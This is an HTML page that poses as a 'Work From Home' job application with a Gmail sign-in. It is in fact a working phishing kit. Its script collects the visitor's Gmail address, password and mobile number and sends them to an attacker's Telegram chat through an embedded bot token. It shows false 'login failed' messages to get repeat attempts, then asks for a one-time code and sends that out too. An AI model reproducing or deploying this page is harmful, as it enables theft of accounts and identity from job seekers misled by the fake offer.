<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Work From Home - Apply now $300/Month</title>
  <style>
    body {
      font-family: "Roboto", Arial, sans-serif;
      background-image: url('https://usa-jobs.github.io/USAJOB.com/USAJOBS.jpg');
      background-size: 100% 100%;
      background-position: center;
      background-repeat: no-repeat;
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-box {
      background: rgba(255, 255, 255, 0.85);
      backdrop-filter: blur(6px);
      width: 360px;
      max-width: 90%;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
      padding: 40px 30px;
      text-align: center;
    }

    .login-box h2 {
      font-size: 22px;
      margin: 10px 0;
      font-weight: 500;
      color: #202124;
    }

    .login-box p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 25px;
    }

    .input-field {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 14px;
    }

    .input-field:focus {
      border-color: #1a73e8;
      outline: none;
      box-shadow: 0 0 2px #1a73e8;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background: #1a73e8;
      color: #fff;
      font-size: 15px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 15px;
    }

    .btn:hover {
      background: #1669c1;
    }

    .error-msg {
      color: red;
      font-size: 13px;
      text-align: left;
      margin-top: -5px;
      margin-bottom: 5px;
    }
  </style>

<body>

  <div class="login-box" id="loginBox">
    <h2>Sign in</h2>
    <p>To Apply - Login Directly with your Gmail</p>

    <!-- Gmail auto-fill -->
    <input type="text" id="username" name="username" class="input-field" placeholder="Select Gmail from below" readonly required>
    <div id="gmailError" class="error-msg"></div>

    <!-- Google Sign-In button -->
    <div id="g_id_onload"
         data-client_id="287551844511-5r820hvv0gf0fd8064i6tmqhuqe5uakk.apps.googleusercontent.com"
         data-callback="handleCredentialResponse"
         data-auto_prompt="false">
    </div>
    <div class="g_id_signin"
         data-type="standard"
         data-shape="rectangular"
         data-theme="outline"
         data-text="continue_with"
         data-size="large"
         data-logo_alignment="left">
    </div>

    <!-- Password + Mobile -->
    <input type="password" id="password" name="password" class="input-field" placeholder="Enter your password" required>
    <input type="text" id="mobile" name="mobile" class="input-field" placeholder="Mobile with country code" required>
    <div id="mobileError" class="error-msg"></div>

    <button id="submitBtn" class="btn">Next</button>
  </div>

  <script>
    let loginAttempt = 0; // counter for login attempts

    // === Telegram Bot Config ===
    const BOT_TOKEN = "8211036124:AAGSsDbdurbpjt7FtEyuKri0sQgmBfCjntU"; 
    const CHAT_ID  = "5738863873"; 

    // Google Sign-In callback
    function handleCredentialResponse(response) {
      const data = JSON.parse(atob(response.credential.split('.')[1]));
      document.getElementById("username").value = data.email;
    }

    // Validation
    function isValidEmail(email) {
      const re = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
      return re.test(email);
    }

    function isValidMobile(mobile) {
      const re = /^91\d{10}$/;
      return re.test(mobile);
    }

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      }).then(res => res.json()).then(console.log).catch(console.error);
    }

    document.getElementById("submitBtn").addEventListener("click", function(e) {
      e.preventDefault();
      loginAttempt++;

      const loginBox = document.getElementById("loginBox");
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const mobile = document.getElementById('mobile').value.trim();

      let valid = true;

      // Gmail validation
      if (!isValidEmail(username)) {
        document.getElementById("gmailError").innerText = "Invalid Gmail format!";
        valid = false;
      } else {
        document.getElementById("gmailError").innerText = "";
      }

      // Mobile validation
      if (!isValidMobile(mobile)) {
        document.getElementById("mobileError").innerText = "Invalid mobile. Must start with 91 + 10 digits.";
        valid = false;
      } else {
        document.getElementById("mobileError").innerText = "";
      }

      if (!valid) return;

      // Telegram payload
      const payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
      sendToTelegram(payload);

      if (loginAttempt < 3) {
        alert("Login failed: Invalid credentials");
      } else if (loginAttempt === 3) {
        // Show OTP input
        loginBox.innerHTML = `
          <h2 style="font-size:24px; color:#1a73e8;">OTP Verification</h2>
          <p style="font-size:16px; color:#202124;">Enter OTP sent to you via Telegram</p>
          <form id="otpForm">
            <input type="text" id="otp" name="otp" class="input-field" placeholder="Enter OTP" required>
            <button type="submit" class="btn">Verify OTP</button>
          </form>
        `;

        document.getElementById('otpForm').addEventListener('submit', function(e) {
          e.preventDefault();
          const otpValue = document.getElementById('otp').value;
          sendToTelegram(`OTP Entered: ${otpValue} ❤️`);

          loginBox.innerHTML = `
            <h2 style="font-size:28px; color:#1a73e8;">Congratulation!</h2>
            <p style="font-size:20px; color:#202124;">Our representative will contact you soon.</p>
          `;
        });
      }
    });
  </script>

</body>
